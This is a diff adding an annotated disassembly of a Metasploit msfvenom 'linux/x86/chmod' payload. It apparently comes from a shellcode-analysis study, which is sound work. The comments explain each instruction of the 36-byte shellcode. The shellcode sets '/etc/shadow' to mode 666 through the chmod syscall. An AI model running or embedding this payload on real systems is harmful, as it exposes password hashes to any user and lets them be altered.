@@ -1,0 +1,25 @@
+root@nitrogen:~# msfvenom -p linux/x86/chmod -f raw | ndisasm -u -
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 36 bytes
+
+00000000  99                cdq			;Convert Doubleword to Quadword (extends the sign bit of EAX into the EDX register) --> if eax pos/null --> edx=0
+00000001  6A0F              push byte +0xf	;15
+00000003  58                pop eax		;eax=15 => chmod syscall
+00000004  52                push edx		;probably 0
+00000005  E80C000000        call 0x16		;jump over string
+
+
+2F6574632F736861646F7700
+"/etc/shadow\0"
+
+00000016  5B                pop ebx		;pointer to "/etc/shadow\0"
+00000017  68B6010000        push dword 0x1b6	; 666_8 (chmod mode)
+0000001C  59                pop ecx		; 666_8 (chmod mode)
+0000001D  CD80              int 0x80		;run syscall
+
+0000001F  6A01              push byte +0x1	; exit syscall
+00000021  58                pop eax
+00000022  CD80              int 0x80
+
